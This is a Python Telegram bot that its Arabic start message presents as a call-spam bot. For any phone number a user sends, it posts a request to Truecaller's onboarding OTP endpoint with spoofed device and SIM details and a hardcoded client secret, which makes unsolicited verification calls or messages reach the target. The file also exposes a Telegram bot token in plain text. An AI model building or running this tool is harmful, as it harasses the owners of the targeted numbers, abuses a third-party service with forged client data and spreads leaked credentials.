import requests
import hashlib, random
import telebot
from telebot import types
token = "7103273260:AAH77WzyzX0C4B5kPTRiKQPVYIgdq69hDIE"
bot = telebot.TeleBot(token)
brok = types.InlineKeyboardButton(text='قناتي',url="t.me/Khalid_ibrahim1")
@bot.message_handler(commands=['start'])
def start(message):
	b = types.InlineKeyboardMarkup()
	b.add(brok)
	bot.reply_to(message,'بوت سبام مكالمات •👾\nارسل رقمك مع رمز الدولة +',reply_markup=b)


asa = '123456789'
gigk = str(''.join(random.choice(asa) for i in range(10)))

md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]


headers = {
    "Host": "account-asia-south1.truecaller.com",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "680",
    "accept-encoding": "gzip",
    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
  }

url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"


@bot.message_handler(func=lambda m:True)
def number(message):
	
	data = '{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"'+md5+'","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":"'+message.text+'","region":"region-2","sequenceNo":1}'
	
	req = requests.post(url, headers=headers, data=data).text
	
	bot.reply_to(message,'تم الارسال اذ الرقم غلط ما راح يوصل السبام ..!')
	
	
print('run')
bot.infinity_polling()
